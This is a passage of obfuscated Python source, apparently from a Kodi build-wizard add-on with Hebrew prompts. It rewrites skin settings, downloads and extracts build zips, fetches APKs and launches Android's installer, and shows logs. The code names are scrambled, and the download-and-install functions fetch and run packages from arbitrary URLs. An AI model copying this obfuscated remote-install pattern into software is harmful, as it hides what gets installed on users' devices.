			O0O00OO0OOOOO0O00 =O00O00OOO0OOOOO00 .read ()#line:4274
			O00O00OOO0OOOOO00 .close ()#line:4275
			OOO000O0000O000OO ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4276
			O0OO0O000OOOO000O =re .compile (OOO000O0000O000OO ).findall (O0O00OO0OOOOO0O00 )[0 ]#line:4277
			O00O00OOO0OOOOO00 =open (O0O000000OOO000OO ,'w')#line:4278
			O00O00OOO0OOOOO00 .write (O0O00OO0OOOOO0O00 .replace ('<setting id="show.cdart" type="bool%s/setting>'%O0OO0O000OOOO000O ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4279
			O00O00OOO0OOOOO00 .close ()#line:4280
			O0O000000OOO000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4284
			O00O00OOO0OOOOO00 =open (O0O000000OOO000OO ,'r')#line:4286
			O0O00OO0OOOOO0O00 =O00O00OOO0OOOOO00 .read ()#line:4287
			O00O00OOO0OOOOO00 .close ()#line:4288
			OOO000O0000O000OO ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4289
			O0OO0O000OOOO000O =re .compile (OOO000O0000O000OO ).findall (O0O00OO0OOOOO0O00 )[0 ]#line:4290
			O00O00OOO0OOOOO00 =open (O0O000000OOO000OO ,'w')#line:4291
			O00O00OOO0OOOOO00 .write (O0O00OO0OOOOO0O00 .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%O0OO0O000OOOO000O ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4292
			O00O00OOO0OOOOO00 .close ()#line:4293
		except :#line:4298
			pass #line:4299
def thirdPartyInstall (OO0OOO0O0O0000OOO ,O00OO0OO000O0O000 ):#line:4301
	if not wiz .workingURL (O00OO0OO000O0O000 ):#line:4302
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4303
	O0OO000OO0OO0OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OOO0O0O0000OOO ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4304
	if O0OO000OO0OO0OO0O ==1 :#line:4305
		freshStart ('third',True )#line:4306
	wiz .clearS ('build')#line:4307
	OOO0OO0O0OO0O00OO =OO0OOO0O0O0000OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4308
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4309
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOO0O0O0000OOO ),'','אנא המתן')#line:4310
	O000O0OO0O000O0O0 =os .path .join (PACKAGES ,'%s.zip'%OOO0OO0O0OO0O00OO )#line:4311
	try :os .remove (O000O0OO0O000O0O0 )#line:4312
	except :pass #line:4313
	downloader .download (O00OO0OO000O0O000 ,O000O0OO0O000O0O0 ,DP )#line:4314
	xbmc .sleep (1000 )#line:4315
	OOOOOO000OOOO0000 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOO0O0O0000OOO )#line:4316
	DP .update (0 ,OOOOOO000OOOO0000 ,'','אנא המתן')#line:4317
	O00OO000O0000OOO0 ,O00OOOOO000O0O0O0 ,O0O000O0OO000O000 =extract .all (O000O0OO0O000O0O0 ,HOME ,DP ,title =OOOOOO000OOOO0000 )#line:4318
	if int (float (O00OO000O0000OOO0 ))>0 :#line:4319
		wiz .fixmetas ()#line:4320
		wiz .lookandFeelData ('save')#line:4321
		wiz .defaultSkin ()#line:4322
		wiz .setS ('installed','true')#line:4324
		wiz .setS ('extract',str (O00OO000O0000OOO0 ))#line:4325
		wiz .setS ('errors',str (O00OOOOO000O0O0O0 ))#line:4326
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O00OO000O0000OOO0 ,O00OOOOO000O0O0O0 ))#line:4327
		try :os .remove (O000O0OO0O000O0O0 )#line:4328
		except :pass #line:4329
		if int (float (O00OOOOO000O0O0O0 ))>0 :#line:4330
			OO000OOOO0O0O0000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OOO0O0O0000OOO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O00OO000O0000OOO0 ,'%',COLOR1 ,O00OOOOO000O0O0O0 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4331
			if OO000OOOO0O0O0000 :#line:4332
				if isinstance (O00OOOOO000O0O0O0 ,unicode ):#line:4333
					O0O000O0OO000O000 =O0O000O0OO000O000 .encode ('utf-8')#line:4334
				wiz .TextBox (ADDONTITLE ,O0O000O0OO000O000 )#line:4335
	DP .close ()#line:4336
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4337
	if INSTALLMETHOD ==1 :O0000OO0000O00O0O =1 #line:4338
	elif INSTALLMETHOD ==2 :O0000OO0000O00O0O =0 #line:4339
	else :O0000OO0000O00O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4340
	if O0000OO0000O00O0O ==1 :wiz .reloadFix ()#line:4341
	else :wiz .killxbmc (True )#line:4342
def testTheme (OOO000000O00O0000 ):#line:4344
	O0O0O00O0O0O0OO0O =zipfile .ZipFile (OOO000000O00O0000 )#line:4345
	for O000O0OOO0O00OOO0 in O0O0O00O0O0O0OO0O .infolist ():#line:4346
		if '/settings.xml'in O000O0OOO0O00OOO0 .filename :#line:4347
			return True #line:4348
	return False #line:4349
def testGui (OOOOOOOOO00OO00OO ):#line:4351
	OO0O000OOO0OOO0O0 =zipfile .ZipFile (OOOOOOOOO00OO00OO )#line:4352
	for OOOOOOOO0O0OOO0O0 in OO0O000OOO0OOO0O0 .infolist ():#line:4353
		if '/guisettings.xml'in OOOOOOOO0O0OOO0O0 .filename :#line:4354
			return True #line:4355
	return False #line:4356
def apkInstaller (O0OO0000000OOO0O0 ,O0OOO000O0OO0OOO0 ):#line:4358
	wiz .log (O0OO0000000OOO0O0 )#line:4359
	wiz .log (O0OOO000O0OO0OOO0 )#line:4360
	if wiz .platform ()=='android':#line:4361
		OO0OOO0000O0OOO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO0000000OOO0O0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4362
		if not OO0OOO0000O0OOO00 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4363
		OOO0OO0OOO00O0OO0 =O0OO0000000OOO0O0 #line:4364
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4365
		if not wiz .workingURL (O0OOO000O0OO0OOO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4366
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO0OOO00O0OO0 ),'','אנא המתן')#line:4367
		O0O0000OO00O00O00 =os .path .join (PACKAGES ,"%s.apk"%O0OO0000000OOO0O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4368
		try :os .remove (O0O0000OO00O00O00 )#line:4369
		except :pass #line:4370
		downloader .download (O0OOO000O0OO0OOO0 ,O0O0000OO00O00O00 ,DP )#line:4371
		xbmc .sleep (100 )#line:4372
		DP .close ()#line:4373
		notify .apkInstaller (O0OO0000000OOO0O0 )#line:4374
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+O0O0000OO00O00O00 +'")')#line:4375
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4376
def createMenu (OOOO00O0O0O00O00O ,O000OOOOOO0OO000O ,OO000OOOO000O0OOO ):#line:4382
	if OOOO00O0O0O00O00O =='saveaddon':#line:4383
		OO00OO0OO0O00O0OO =[]#line:4384
		O0OO00000OO00OOOO =urllib .quote_plus (O000OOOOOO0OO000O .lower ().replace (' ',''))#line:4385
		O000OO0OOO0000OO0 =O000OOOOOO0OO000O .replace ('Debrid','Real Debrid')#line:4386
		O00000O0OO0OO0O0O =urllib .quote_plus (OO000OOOO000O0OOO .lower ().replace (' ',''))#line:4387
		OO000OOOO000O0OOO =OO000OOOO000O0OOO .replace ('url','URL Resolver')#line:4388
		OO00OO0OO0O00O0OO .append ((THEME2 %OO000OOOO000O0OOO .title (),' '))#line:4389
		OO00OO0OO0O00O0OO .append ((THEME3 %'Save %s Data'%O000OO0OOO0000OO0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0OO00000OO00OOOO ,O00000O0OO0OO0O0O )))#line:4390
		OO00OO0OO0O00O0OO .append ((THEME3 %'Restore %s Data'%O000OO0OOO0000OO0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0OO00000OO00OOOO ,O00000O0OO0OO0O0O )))#line:4391
		OO00OO0OO0O00O0OO .append ((THEME3 %'Clear %s Data'%O000OO0OOO0000OO0 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0OO00000OO00OOOO ,O00000O0OO0OO0O0O )))#line:4392
	elif OOOO00O0O0O00O00O =='save':#line:4393
		OO00OO0OO0O00O0OO =[]#line:4394
		O0OO00000OO00OOOO =urllib .quote_plus (O000OOOOOO0OO000O .lower ().replace (' ',''))#line:4395
		O000OO0OOO0000OO0 =O000OOOOOO0OO000O .replace ('Debrid','Real Debrid')#line:4396
		O00000O0OO0OO0O0O =urllib .quote_plus (OO000OOOO000O0OOO .lower ().replace (' ',''))#line:4397
		OO000OOOO000O0OOO =OO000OOOO000O0OOO .replace ('url','URL Resolver')#line:4398
		OO00OO0OO0O00O0OO .append ((THEME2 %OO000OOOO000O0OOO .title (),' '))#line:4399
		OO00OO0OO0O00O0OO .append ((THEME3 %'Register %s'%O000OO0OOO0000OO0 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0OO00000OO00OOOO ,O00000O0OO0OO0O0O )))#line:4400
		OO00OO0OO0O00O0OO .append ((THEME3 %'Save %s Data'%O000OO0OOO0000OO0 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0OO00000OO00OOOO ,O00000O0OO0OO0O0O )))#line:4401
		OO00OO0OO0O00O0OO .append ((THEME3 %'Restore %s Data'%O000OO0OOO0000OO0 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0OO00000OO00OOOO ,O00000O0OO0OO0O0O )))#line:4402
		OO00OO0OO0O00O0OO .append ((THEME3 %'Import %s Data'%O000OO0OOO0000OO0 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0OO00000OO00OOOO ,O00000O0OO0OO0O0O )))#line:4403
		OO00OO0OO0O00O0OO .append ((THEME3 %'Clear Addon %s Data'%O000OO0OOO0000OO0 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0OO00000OO00OOOO ,O00000O0OO0OO0O0O )))#line:4404
	elif OOOO00O0O0O00O00O =='install':#line:4405
		OO00OO0OO0O00O0OO =[]#line:4406
		O00000O0OO0OO0O0O =urllib .quote_plus (OO000OOOO000O0OOO )#line:4407
		OO00OO0OO0O00O0OO .append ((THEME2 %OO000OOOO000O0OOO ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O00000O0OO0OO0O0O )))#line:4408
		OO00OO0OO0O00O0OO .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O00000O0OO0OO0O0O )))#line:4409
		OO00OO0OO0O00O0OO .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O00000O0OO0OO0O0O )))#line:4410
		OO00OO0OO0O00O0OO .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O00000O0OO0OO0O0O )))#line:4411
		OO00OO0OO0O00O0OO .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O00000O0OO0OO0O0O )))#line:4412
	OO00OO0OO0O00O0OO .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4413
	return OO00OO0OO0O00O0OO #line:4414
def toggleCache (OO0O0O0OO0O0OOO0O ):#line:4416
	O0000OOO0O0000OO0 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4417
	OO0OOOOO000O0OOOO =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4418
	if OO0O0O0OO0O0OOO0O in ['true','false']:#line:4419
		for OO0OOO00OO0OOOOO0 in O0000OOO0O0000OO0 :#line:4420
			wiz .setS (OO0OOO00OO0OOOOO0 ,OO0O0O0OO0O0OOO0O )#line:4421
	else :#line:4422
		if not OO0O0O0OO0O0OOO0O in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4423
			try :#line:4424
				OO0OOO00OO0OOOOO0 =OO0OOOOO000O0OOOO [O0000OOO0O0000OO0 .index (OO0O0O0OO0O0OOO0O )]#line:4425
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OO0OOO00OO0OOOOO0 ))#line:4426
			except :#line:4427
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,OO0O0O0OO0O0OOO0O ))#line:4428
		else :#line:4429
			O00O0O00OO00O0O00 ='true'if wiz .getS (OO0O0O0OO0O0OOO0O )=='false'else 'false'#line:4430
			wiz .setS (OO0O0O0OO0O0OOO0O ,O00O0O00OO00O0O00 )#line:4431
def playVideo (OO000O00O00OO0000 ):#line:4433
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OO000O00O00OO0000 )#line:4434
	if 'watch?v='in OO000O00O00OO0000 :#line:4435
		O00O000OO0OO0O0O0 ,OO00O0000O00O0OOO =OO000O00O00OO0000 .split ('?')#line:4436
		OO000OO0OOOO0OO00 =OO00O0000O00O0OOO .split ('&')#line:4437
		for O00O00O0OO0OOOOO0 in OO000OO0OOOO0OO00 :#line:4438
			if O00O00O0OO0OOOOO0 .startswith ('v='):#line:4439
				OO000O00O00OO0000 =O00O00O0OO0OOOOO0 [2 :]#line:4440
				break #line:4441
			else :continue #line:4442
	elif 'embed'in OO000O00O00OO0000 or 'youtu.be'in OO000O00O00OO0000 :#line:4443
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OO000O00O00OO0000 )#line:4444
		O00O000OO0OO0O0O0 =OO000O00O00OO0000 .split ('/')#line:4445
		if len (O00O000OO0OO0O0O0 [-1 ])>5 :#line:4446
			OO000O00O00OO0000 =O00O000OO0OO0O0O0 [-1 ]#line:4447
		elif len (O00O000OO0OO0O0O0 [-2 ])>5 :#line:4448
			OO000O00O00OO0000 =O00O000OO0OO0O0O0 [-2 ]#line:4449
	wiz .log ("YouTube URL: %s"%OO000O00O00OO0000 )#line:4450
	yt .PlayVideo (OO000O00O00OO0000 )#line:4451
def viewLogFile ():#line:4453
	OO0OOO0O000O000OO =wiz .Grab_Log (True )#line:4454
	OOO00O000OO00OOO0 =wiz .Grab_Log (True ,True )#line:4455
	O0OOOO00OOOO0O0O0 =0 ;OO0000O00OOOO0O0O =OO0OOO0O000O000OO #line:4456
	if not OOO00O000OO00OOO0 ==False and not OO0OOO0O000O000OO ==False :#line:4457
		O0OOOO00OOOO0O0O0 =DIALOG .select (ADDONTITLE ,["View %s"%OO0OOO0O000O000OO .replace (LOG ,""),"View %s"%OOO00O000OO00OOO0 .replace (LOG ,"")])#line:4458
		if O0OOOO00OOOO0O0O0 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4459
	elif OO0OOO0O000O000OO ==False and OOO00O000OO00OOO0 ==False :#line:4460
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4461
		return #line:4462
	elif not OO0OOO0O000O000OO ==False :O0OOOO00OOOO0O0O0 =0 #line:4463
	elif not OOO00O000OO00OOO0 ==False :O0OOOO00OOOO0O0O0 =1 #line:4464
	OO0000O00OOOO0O0O =OO0OOO0O000O000OO if O0OOOO00OOOO0O0O0 ==0 else OOO00O000OO00OOO0 #line:4466
	OO000OOOO000O00O0 =wiz .Grab_Log (False )if O0OOOO00OOOO0O0O0 ==0 else wiz .Grab_Log (False ,True )#line:4467
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OO0000O00OOOO0O0O ),OO000OOOO000O00O0 )#line:4469
def errorChecking (log =None ,count =None ,all =None ):#line:4471
	if log ==None :#line:4472
		OO0O0OOO0OOOOOOO0 =wiz .Grab_Log (True )#line:4473
		O0O00000OOOOO0OO0 =wiz .Grab_Log (True ,True )#line:4474
		if not O0O00000OOOOO0OO0 ==False and not OO0O0OOO0OOOOOOO0 ==False :#line:4475
			OOO000O0OO0OOO000 =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OO0O0OOO0OOOOOOO0 .replace (LOG ,""),errorChecking (OO0O0OOO0OOOOOOO0 ,True ,True )),"View %s: %s error(s)"%(O0O00000OOOOO0OO0 .replace (LOG ,""),errorChecking (O0O00000OOOOO0OO0 ,True ,True ))])#line:4476
			if OOO000O0OO0OOO000 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4477
		elif OO0O0OOO0OOOOOOO0 ==False and O0O00000OOOOO0OO0 ==False :#line:4478
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4479
			return #line:4480
		elif not OO0O0OOO0OOOOOOO0 ==False :OOO000O0OO0OOO000 =0 #line:4481
		elif not O0O00000OOOOO0OO0 ==False :OOO000O0OO0OOO000 =1 #line:4482
		log =OO0O0OOO0OOOOOOO0 if OOO000O0OO0OOO000 ==0 else O0O00000OOOOO0OO0 #line:4483
	if log ==False :#line:4484
		if count ==None :#line:4485
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4486
			return False #line:4487
		else :#line:4488
			return 0 #line:4489
	else :#line:4490
		if os .path .exists (log ):#line:4491
			O000O00OO00O00O00 =open (log ,mode ='r');O00O0O0000O0OO0O0 =O000O00OO00O00O00 .read ().replace ('\n','').replace ('\r','');O000O00OO00O00O00 .close ()#line:4492
			OOOO0OOO0OO0OOOO0 =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (O00O0O0000O0OO0O0 )#line:4493
			if not count ==None :#line:4494
				if all ==None :#line:4495
					OO0O00OO00O0O0OOO =0 #line:4496
					for OOOO0O00OOOO00O0O in OOOO0OOO0OO0OOOO0 :#line:4497
						if ADDON_ID in OOOO0O00OOOO00O0O :OO0O00OO00O0O0OOO +=1 #line:4498
					return OO0O00OO00O0O0OOO #line:4499
				else :return len (OOOO0OOO0OO0OOOO0 )#line:4500
			if len (OOOO0OOO0OO0OOOO0 )>0 :#line:4501
				OO0O00OO00O0O0OOO =0 ;OO0000O0OOO00OOOO =""#line:4502
				for OOOO0O00OOOO00O0O in OOOO0OOO0OO0OOOO0 :#line:4503
					if all ==None and not ADDON_ID in OOOO0O00OOOO00O0O :continue #line:4504
					else :#line:4505
						OO0O00OO00O0O0OOO +=1 #line:4506
						OO0000O0OOO00OOOO +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OO0O00OO00O0O0OOO ,OOOO0O00OOOO00O0O .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4507
				if OO0O00OO00O0O0OOO >0 :#line:4508
					wiz .TextBox (ADDONTITLE ,OO0000O0OOO00OOOO )#line:4509
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4510
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4511
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4512
ACTION_PREVIOUS_MENU =10 #line:4514
ACTION_NAV_BACK =92 #line:4515
ACTION_MOVE_LEFT =1 #line:4516
ACTION_MOVE_RIGHT =2 #line:4517
ACTION_MOVE_UP =3 #line:4518
ACTION_MOVE_DOWN =4 #line:4519
ACTION_MOUSE_WHEEL_UP =104 #line:4520
ACTION_MOUSE_WHEEL_DOWN =105 #line:4521
ACTION_MOVE_MOUSE =107 #line:4522
ACTION_SELECT_ITEM =7 #line:4523
ACTION_BACKSPACE =110 #line:4524
ACTION_MOUSE_LEFT_CLICK =100 #line:4525
ACTION_MOUSE_LONG_CLICK =108 #line:4526
def LogViewer (default =None ):#line:4528
	class OOO00OOOOO0O0O0O0 (xbmcgui .WindowXMLDialog ):#line:4529
		def __init__ (O0O00OOOOOOO0O000 ,*O0OOOOO00O00OOOO0 ,**OO0O0OO00000OO00O ):#line:4530
			O0O00OOOOOOO0O000 .default =OO0O0OO00000OO00O ['default']#line:4531
		def onInit (OOOOOO000O0000OO0 ):#line:4533
			OOOOOO000O0000OO0 .title =101 #line:4534
			OOOOOO000O0000OO0 .msg =102 #line:4535
			OOOOOO000O0000OO0 .scrollbar =103 #line:4536
			OOOOOO000O0000OO0 .upload =201 #line:4537
			OOOOOO000O0000OO0 .kodi =202 #line:4538
			OOOOOO000O0000OO0 .kodiold =203 #line:4539
			OOOOOO000O0000OO0 .wizard =204 #line:4540
			OOOOOO000O0000OO0 .okbutton =205 #line:4541
			OOOO0000OOOO0OOOO =open (OOOOOO000O0000OO0 .default ,'r')#line:4542
			OOOOOO000O0000OO0 .logmsg =OOOO0000OOOO0OOOO .read ()#line:4543
			OOOO0000OOOO0OOOO .close ()#line:4544
			OOOOOO000O0000OO0 .titlemsg ="%s: %s"%(ADDONTITLE ,OOOOOO000O0000OO0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4545
			OOOOOO000O0000OO0 .showdialog ()#line:4546
		def showdialog (O0000OOO000O0O0O0 ):#line:4548
			O0000OOO000O0O0O0 .getControl (O0000OOO000O0O0O0 .title ).setLabel (O0000OOO000O0O0O0 .titlemsg )#line:4549
			O0000OOO000O0O0O0 .getControl (O0000OOO000O0O0O0 .msg ).setText (wiz .highlightText (O0000OOO000O0O0O0 .logmsg ))#line:4550
			O0000OOO000O0O0O0 .setFocusId (O0000OOO000O0O0O0 .scrollbar )#line:4551
		def onClick (OO0O0O0O0OO00OOOO ,O0O0O00OOOOO00O0O ):#line:4553
			if O0O0O00OOOOO00O0O ==OO0O0O0O0OO00OOOO .okbutton :OO0O0O0O0OO00OOOO .close ()#line:4554
			elif O0O0O00OOOOO00O0O ==OO0O0O0O0OO00OOOO .upload :OO0O0O0O0OO00OOOO .close ();uploadLog .Main ()#line:4555
			elif O0O0O00OOOOO00O0O ==OO0O0O0O0OO00OOOO .kodi :#line:4556
				OO0OOOOO0000OOOO0 =wiz .Grab_Log (False )#line:4557
				OOO000O00000O0OOO =wiz .Grab_Log (True )#line:4558
				if OO0OOOOO0000OOOO0 ==False :#line:4559
					OO0O0O0O0OO00OOOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4560
					OO0O0O0O0OO00OOOO .getControl (OO0O0O0O0OO00OOOO .msg ).setText ("Log File Does Not Exists!")#line:4561
				else :#line:4562
					OO0O0O0O0OO00OOOO .titlemsg ="%s: %s"%(ADDONTITLE ,OOO000O00000O0OOO .replace (LOG ,''))#line:4563
					OO0O0O0O0OO00OOOO .getControl (OO0O0O0O0OO00OOOO .title ).setLabel (OO0O0O0O0OO00OOOO .titlemsg )#line:4564
					OO0O0O0O0OO00OOOO .getControl (OO0O0O0O0OO00OOOO .msg ).setText (wiz .highlightText (OO0OOOOO0000OOOO0 ))#line:4565
					OO0O0O0O0OO00OOOO .setFocusId (OO0O0O0O0OO00OOOO .scrollbar )#line:4566
			elif O0O0O00OOOOO00O0O ==OO0O0O0O0OO00OOOO .kodiold :#line:4567
				OO0OOOOO0000OOOO0 =wiz .Grab_Log (False ,True )#line:4568
				OOO000O00000O0OOO =wiz .Grab_Log (True ,True )#line:4569
				if OO0OOOOO0000OOOO0 ==False :#line:4570
					OO0O0O0O0OO00OOOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4571
					OO0O0O0O0OO00OOOO .getControl (OO0O0O0O0OO00OOOO .msg ).setText ("Log File Does Not Exists!")#line:4572
				else :#line:4573
					OO0O0O0O0OO00OOOO .titlemsg ="%s: %s"%(ADDONTITLE ,OOO000O00000O0OOO .replace (LOG ,''))#line:4574
					OO0O0O0O0OO00OOOO .getControl (OO0O0O0O0OO00OOOO .title ).setLabel (OO0O0O0O0OO00OOOO .titlemsg )#line:4575
					OO0O0O0O0OO00OOOO .getControl (OO0O0O0O0OO00OOOO .msg ).setText (wiz .highlightText (OO0OOOOO0000OOOO0 ))#line:4576
					OO0O0O0O0OO00OOOO .setFocusId (OO0O0O0O0OO00OOOO .scrollbar )#line:4577
			elif O0O0O00OOOOO00O0O ==OO0O0O0O0OO00OOOO .wizard :#line:4578
				OO0OOOOO0000OOOO0 =wiz .Grab_Log (False ,False ,True )#line:4579
				OOO000O00000O0OOO =wiz .Grab_Log (True ,False ,True )#line:4580
				if OO0OOOOO0000OOOO0 ==False :#line:4581
					OO0O0O0O0OO00OOOO .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4582
					OO0O0O0O0OO00OOOO .getControl (OO0O0O0O0OO00OOOO .msg ).setText ("Log File Does Not Exists!")#line:4583
				else :#line:4584
					OO0O0O0O0OO00OOOO .titlemsg ="%s: %s"%(ADDONTITLE ,OOO000O00000O0OOO .replace (ADDONDATA ,''))#line:4585
					OO0O0O0O0OO00OOOO .getControl (OO0O0O0O0OO00OOOO .title ).setLabel (OO0O0O0O0OO00OOOO .titlemsg )#line:4586
					OO0O0O0O0OO00OOOO .getControl (OO0O0O0O0OO00OOOO .msg ).setText (wiz .highlightText (OO0OOOOO0000OOOO0 ))#line:4587
					OO0O0O0O0OO00OOOO .setFocusId (OO0O0O0O0OO00OOOO .scrollbar )#line:4588
		def onAction (O00O0O0O0000O0O0O ,OO00O0O0OO000OO00 ):#line:4590
			if OO00O0O0OO000OO00 ==ACTION_PREVIOUS_MENU :O00O0O0O0000O0O0O .close ()#line:4591
			elif OO00O0O0OO000OO00 ==ACTION_NAV_BACK :O00O0O0O0000O0O0O .close ()#line:4592
	if default ==None :default =wiz .Grab_Log (True )#line:4593
	OOO0O00O000OOOO00 =OOO00OOOOO0O0O0O0 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4594
	OOO0O00O000OOOO00 .doModal ()#line:4595
	del OOO0O00O000OOOO00 #line:4596
def removeAddon (O00000O00O00O0OO0 ,O00O000OOOOO00OO0 ,over =False ):#line:4598
	if not over ==False :#line:4599
		O0O0OO000OOOO0000 =1 #line:4600
	else :#line:4601
